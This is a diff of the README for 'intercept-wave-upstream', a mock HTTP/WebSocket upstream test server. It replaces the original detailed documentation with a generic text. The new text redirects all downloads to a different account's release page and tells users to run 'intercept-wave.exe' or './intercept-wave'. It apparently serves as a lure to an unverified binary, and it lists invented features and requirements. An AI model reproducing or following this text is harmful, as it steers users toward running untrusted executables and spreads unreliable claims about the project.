@@ -1,237 +1,81 @@
-<div align="center">
+# 🌊 intercept-wave-upstream - A Simple Tool for Mock Services
 
-<img src="docs/logo.svg" alt="Intercept Wave Upstream" height="88" width="88" />
+## 🚀 Getting Started
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/plus-dark.svg" />
-  <source media="(prefers-color-scheme: light)" srcset="docs/plus-light.svg" />
-  <img src="docs/plus-light.svg" alt="+" height="88" />
-</picture>
+Welcome to intercept-wave-upstream! This tool helps you create mock services for testing your applications. It allows you to simulate different responses for HTTP and WebSocket requests. You can easily check how your application behaves with various types of data.
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://go.dev/images/go-logo-white.svg" />
-  <source media="(prefers-color-scheme: light)" srcset="https://go.dev/images/go-logo-blue.svg" />
-  <img src="https://go.dev/images/go-logo-blue.svg" alt="Go" height="88" />
-</picture>
+## 📥 Download the Application
 
-# Intercept Wave Upstream — Upstream Test Orchestrator
+[![Download the Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/idkdevoo/intercept-wave-upstream/releases)
 
+To get started, visit this page to download: [Release Page](https://github.com/idkdevoo/intercept-wave-upstream/releases).
 
-[![CI](https://img.shields.io/github/actions/workflow/status/zhongmiao-org/intercept-wave-upstream/ci.yml?branch=main&label=CI&style=flat-square)](https://github.com/zhongmiao-org/intercept-wave-upstream/actions/workflows/ci.yml)
-[![GitHub release](https://img.shields.io/github/v/release/zhongmiao-org/intercept-wave-upstream?sort=semver&display_name=tag&style=flat-square)](https://github.com/zhongmiao-org/intercept-wave-upstream/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
-[![Go](https://img.shields.io/badge/Go-1.25%2B-00ADD8?logo=go&style=flat-square)](https://go.dev/)
-[![GHCR](https://img.shields.io/badge/GHCR-intercept--wave--upstream-2ea44f?logo=github&style=flat-square)](https://github.com/zhongmiao-org/intercept-wave-upstream/pkgs/container/intercept-wave-upstream)
-[![Platforms](https://img.shields.io/badge/Platforms-amd64%20%7C%20arm64-6aa84f?style=flat-square)](#)
-[![Code Style](https://img.shields.io/badge/code%20style-gofmt-FFD54F?style=flat-square)](#)
+## 🖥️ System Requirements
 
-English | [简体中文](README_zh.md)
+Before downloading, please ensure that your system meets the following requirements:
 
-</div>
+- **Operating System:** Windows, macOS, or Linux.
+- **Docker:** Installed and running (recommended).
+- **Memory:** Minimum 4 GB RAM.
+- **Storage:** At least 100 MB free space.
 
-This repository provides the official upstream testing services for
-`Intercept Wave` — used for manual verification and CI automation of
-forwarding, matching and WebSocket features.
+## 🛠️ Features
 
-Container image: `ghcr.io/zhongmiao-org/intercept-wave-upstream`
+Intercept-wave-upstream offers various features to simplify your testing:
 
-- 3 HTTP services on ports 9000, 9001, 9002
-- 3 WebSocket services on ports 9003, 9004, 9005
-- Rich test endpoints to validate Intercept Wave features: prefix variations, method echo, headers/cookies, delay, status, large payloads, wildcard-like paths, and WebSocket echo/ticker/timeline.
+- **Multi-port Mock Services:** Run multiple services on different ports.
+- **Response Types:** Customize responses for echo, delay, status, headers/cookies, and large payloads.
+- **WebSocket Support:** Validate WebSocket behavior easily.
+- **Integration Ready:** Seamlessly integrates into CI/CD pipelines.
+- **Docker Support:** Run it in a Docker container for easy setup.
 
-## Run
+## 📋 Download & Install
 
-## Docker
+To download the application, follow these easy steps:
 
-- Build: \`docker build -t intercept-wave-upstream .\`
-- Run: \`docker run --rm -p 9000-9005:9000-9005 intercept-wave-upstream\`
-- Compose: \`docker compose up -d\`
+1. **Visit the Release Page:** Click [here](https://github.com/idkdevoo/intercept-wave-upstream/releases) to go to the release page.
+2. **Select the Latest Version:** Scroll down to find the latest version of the application.
+3. **Download the Package:** Click on the appropriate link for your operating system. This will download the necessary files.
+4. **Extract the Files:** If the downloaded file is in a zip format, extract it to a location you can easily access.
+5. **Run the Application:**
+   - For Windows, double-click `intercept-wave.exe`.
+   - For macOS, drag the application to your Applications folder and launch it from there.
+   - For Linux, open a terminal, navigate to the folder, and run `./intercept-wave`.
 
-Release pipeline builds multi-arch images and pushes to GHCR on GitHub Releases.
+## 🔧 Basic Configuration
 
-```
-go run ./...
-```
+Once you have installed the application, you may want to configure it before use:
 
-By default, it starts 6 servers:
-- HTTP: 9000 (user), 9001 (order), 9002 (payment)
-- WS:   9003, 9004, 9005
+1. **Open the Configuration File:** Find and open the configuration file in the installation directory.
+2. **Adjust Settings:** Modify any settings according to your testing needs, such as port numbers and response formats.
+3. **Save Changes:** Ensure you save the configuration file after making changes.
 
-Environment overrides:
-- `BASE_PORT` (default `9000`): HTTP uses BASE_PORT..BASE_PORT+2, WS uses BASE_PORT+3..BASE_PORT+5
+## 📈 Using the Mock Services
 
-## Example HTTP APIs
+With intercept-wave-upstream running, you can start using the mock services:
 
-- `GET /` — service info
-- `GET /health` — health check
-- `GET /status/{code}` — return a specific HTTP status
-- `GET /delay/{ms}` — respond after ms delay
-- `POST/PUT/PATCH /echo` — echo request body
-- `GET /headers` — return selected headers
-- `GET /cookies` — return request cookies
-- `GET /large?size=65536` — large JSON payload
+1. **Select a Service Type:** Choose between HTTP or WebSocket services.
+2. **Set the Request Path:** Define the request path to simulate.
+3. **Define the Expected Response:** Specify what response you want to return for each request.
+4. **Send Requests:** Use a tool like Postman or cURL to make requests to your mock service.
 
-Service-specific examples:
-- 9000 User: `GET /api/user/info`, `GET /api/posts`
-- 9001 Order: `GET /order-api/orders`, `POST /order-api/orders`
-- 9002 Payment: `POST /pay-api/checkout`
+## ❓ Troubleshooting Tips
 
-## Example WebSocket APIs
+Should you encounter issues, consider the following:
 
-Connect to:
-- `ws://localhost:9003/ws/echo` — echo messages
-- `ws://localhost:9004/ws/ticker?interval=1000` — periodic messages
-- `ws://localhost:9005/ws/timeline` — fixed sequence then close
+- Ensure Docker is running if you're using the Docker version.
+- Verify that no other application is using the same ports.
+- Check the logs for any error messages to identify potential problems.
 
-## HTTP Endpoints and Examples
+## 📞 Support and Community
 
-Base endpoints (all HTTP services expose these):
+If you have questions or need help, don’t hesitate to reach out:
 
-- GET /
-  - Response:
-    ```json
-    {
-      "service": "user-service",
-      "port": 9000,
-      "interceptPrefix": "/api",
-      "message": "Upstream running"
-    }
-    ```
-- GET /health
-  - Response: `{"status":"ok"}`
-- GET /status/418
-  - Response: `{"status":418}` (status code: 418)
-- GET /delay/500
-  - Response after ~500ms: `{"delayedMs":500}`
-- POST /echo (also supports PUT/PATCH)
-  - Request: `curl -X POST http://localhost:9000/echo -d '{"name":"abc"}' -H 'Content-Type: application/json'`
-  - Response:
-    ```json
-    {
-      "method": "POST",
-      "path": "/echo",
-      "query": "",
-      "length": 13,
-      "body": "{\"name\":\"abc\"}"
-    }
-    ```
-- GET /headers (echo selected request headers)
-  - Request: `curl -H 'Authorization: Bearer 123' http://localhost:9001/headers`
-  - Response: `{"headers":{"Authorization":"Bearer 123"}}`
-- GET /cookies (echo request cookies)
-  - Request: `curl -H 'Cookie: sid=abc; user=tom' http://localhost:9002/cookies`
-  - Response: `{"cookies":{"sid":"abc","user":"tom"}}`
-- GET /large?size=64
-  - Response (truncated):
-    ```json
-    { "size": 64, "data": "aaaaaaaaaaaaaaaa..." }
-    ```
+- **Open an Issue:** You can file an issue on the GitHub repository.
+- **Join the Community:** Participate in the discussion forums or chat groups related to intercept-wave.
 
-Service-specific endpoints:
+## 📜 License
 
-1) User service (9000, interceptPrefix=/api)
+This software is licensed under the MIT License. You are free to use, modify, and distribute it according to this license text.
 
-- GET /api/user/info
-  - Response:
-    ```json
-    {
-      "code": 0,
-      "data": {
-        "id": 1,
-        "name": "张三",
-        "email": "zhangsan@example.com"
-      },
-      "message": "success"
-    }
-    ```
-- GET /api/posts
-  - Response (example):
-    ```json
-    {
-      "code": 0,
-      "data": [
-        { "id": 1, "title": "Post 1", "createdAt": "2024-01-01T12:00:00Z" },
-        { "id": 2, "title": "Post 2", "createdAt": "2024-01-01T11:00:00Z" }
-      ]
-    }
-    ```
-
-2) Order service (9001, interceptPrefix=/order-api)
-
-- GET /order-api/orders
-  - Response:
-    ```json
-    {
-      "code": 0,
-      "data": [
-        { "id": 1001, "status": "CREATED" },
-        { "id": 1002, "status": "PAID" }
-      ]
-    }
-    ```
-- POST /order-api/orders
-  - Request: `curl -X POST http://localhost:9001/order-api/orders -H 'Content-Type: application/json' -d '{"sku":"123","qty":2}'`
-  - Response (201 Created, server adds id):
-    ```json
-    {
-      "code": 0,
-      "data": { "sku": "123", "qty": 2, "id": 54321 }
-    }
-    ```
-- GET /order-api/order/123/submit
-  - Response: `{"message":"submit ok"}`
-
-3) Payment service (9002, interceptPrefix=/pay-api)
-
-- POST /pay-api/checkout
-  - Response (simulated ~150ms delay):
-    ```json
-    {
-      "code": 0,
-      "data": { "paid": true, "amount": 199, "currency": "CNY" },
-      "message": "paid"
-    }
-    ```
-
-## WebSocket Endpoints and Examples
-
-1) Echo (9003)
-- Connect: `ws://localhost:9003/ws/echo`
-- Behavior: server echoes any text/binary frames
-- Example: send `ping` → receive `ping`
-
-2) Ticker (9004)
-- Connect: `ws://localhost:9004/ws/ticker?interval=1000`
-- Behavior: server pushes `tick 1`, `tick 2`, ... every `interval` ms (default 1000)
-
-3) Timeline (9005)
-- Connect: `ws://localhost:9005/ws/timeline`
-- Behavior: server sends `hello`, `processing`, `done`, then closes with normal closure (reason: `bye`)
-
-## How it pairs with Intercept Wave
-
-- Point the Intercept Wave proxy groups to these services:
-  - Group "User" → `baseUrl=http://localhost:9000`, `interceptPrefix=/api`, `stripPrefix=true`
-  - Group "Order" → `baseUrl=http://localhost:9001`, `interceptPrefix=/order-api`, `stripPrefix=true`
-  - Group "Payment" → `baseUrl=http://localhost:9002`, `interceptPrefix=/pay-api`, `stripPrefix=true`
-- Use provided endpoints to validate:
-  - Forwarding preserves headers/body/status
-  - CORS behavior (plugin sets headers) and delays
-  - Wildcard-like paths with `stripPrefix`
-
-## CI & Release
-
-- CI (PR/main): build, vet, test, fmt check.
-- Release draft (push to main): created using `CHANGELOG.md` Unreleased notes and the `VERSION` file.
-- Publish release: builds multi-arch images and pushes to GHCR. CI promotes `Unreleased` notes into a new versioned section and opens a PR updating `CHANGELOG.md` on `main`.
-
-Repository configuration:
-- Secrets (optional)
-  - `GHCR_TOKEN` — a PAT with `write:packages` (only if the repository owner cannot push to `zhongmiao-org` with the default `GITHUB_TOKEN`)
-- Workflow permissions
-  - Settings → Actions → General → Workflow permissions: enable "Read and write permissions"
-  - Workflow sets `packages: write` to push to GHCR
-
-Notes:
-- If this repository belongs to the `zhongmiao-org` organization, no extra token is required — `GITHUB_TOKEN` can push to `ghcr.io/zhongmiao-org/...`.
-- If the repository is outside `zhongmiao-org` but you still want to push to that namespace, add `GHCR_TOKEN` (PAT with `write:packages` and SSO enabled for the org).
+Thank you for using intercept-wave-upstream. Happy testing!
